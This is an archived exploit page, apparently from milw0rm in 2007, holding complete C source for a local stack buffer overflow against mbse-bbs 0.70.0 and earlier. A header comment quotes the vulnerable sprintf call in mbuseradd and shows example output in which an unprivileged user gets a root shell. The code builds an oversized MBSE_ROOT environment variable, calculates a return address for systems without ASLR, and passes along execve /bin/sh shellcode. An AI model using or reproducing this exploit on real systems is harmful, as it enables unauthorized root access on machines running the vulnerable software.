<html><head><title>GNU/Linux mbse-bbs <= 0.70.0 Local Buffer Overflow Exploit</title></head><pre>/* GNU/Linux mbse-bbs 0.70.0 &amp; below stack overflow exploit
 * ========================================================
 * Multiple overflow conditions occur within mbse-bbs versions 0.70.0 &amp; below.
 * The current version of mbse-bbs does not contain these weaknesses. 
 * Exploitation of these vulnerabilities can facilitate a privilege escalation
 * attack in which an unprivileged user becomes root. Exploit calculates
 * return address where ASLR is not in use. Vulnerable code is shown below;
 * 
 * matthew@localhost ~/foo/mbsebbs-0.70.0/unix $  cat -n mbuseradd.c 
 * ...
 * 177          shell   = calloc(PATH_MAX, sizeof(char));
 * ...
 * 228          sprintf(shell, &quot;%s/bin/mbsebbs&quot;, getenv(&quot;MBSE_ROOT&quot;));
 * 
 * (heap corruption in 0.33.17/stack overflow in others).
 * *** glibc detected *** free(): invalid next size (normal): 0x0804e068 ***
 *
 * Example Usage.
 *  matthew@localhost ~ $ id
 *  uid=1000(matthew) gid=100(users) groups=10(wheel),100(users)
 *  matthew@localhost ~ $ ./prdelka-vs-GNU-mbsebbs /opt/mbse/bin/mbuseradd
 *  [ GNU/Linux mbse-bbs 0.70.0 &amp; below stack overflow exploit
 *  [ Using return address 0xbfffefd8
 *  sh-3.1# id
 *  uid=0(root) gid=1(bin) groups=10(wheel),100(users)
 * 
 * - prdelka
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

char shellcode[]=&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
                 &quot;\x31\xc0\x50\x68&quot;&quot;//sh&quot;&quot;\x68&quot;&quot;/bin&quot;&quot;\x89\xe3&quot;
                 &quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;

int main(int argc,char* argv[]) {
        int i;
        long eip = 0x41414141;
	char envh[]=&quot;MBSE_ROOT=&quot;;
	printf(&quot;[ GNU/Linux mbse-bbs 0.70.0 &amp; below stack overflow exploit\n&quot;);
        if(argc &lt; 2) {
                printf(&quot;Error: [path]\n&quot;);
                exit(0);
        }
        char* buffer = malloc(strlen(envh) + 4085 + sizeof(eip));
	strcpy(buffer,envh);
        long ptr = (long)buffer;	
        for(i = 1;i &lt;= 4061;i++){
                strncat(buffer,&quot;A&quot;,1);
        }
        ptr = ptr + 4061;
        memcpy((char*)ptr,(char*)&amp;eip,4);
        eip = 0xc0000000 -4 -strlen(argv[1]) -1 -strlen(buffer) -1 -strlen(shellcode) -1;
        memcpy((char*)ptr,(char*)&amp;eip,4);
        char *env[] = {buffer,NULL};
        printf(&quot;[ Using return address 0x%x\n&quot;,eip);
        execle(argv[1],argv[1],&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,shellcode,NULL,env);
        exit(0);
}

// milw0rm.com [2007-01-18]</pre></html>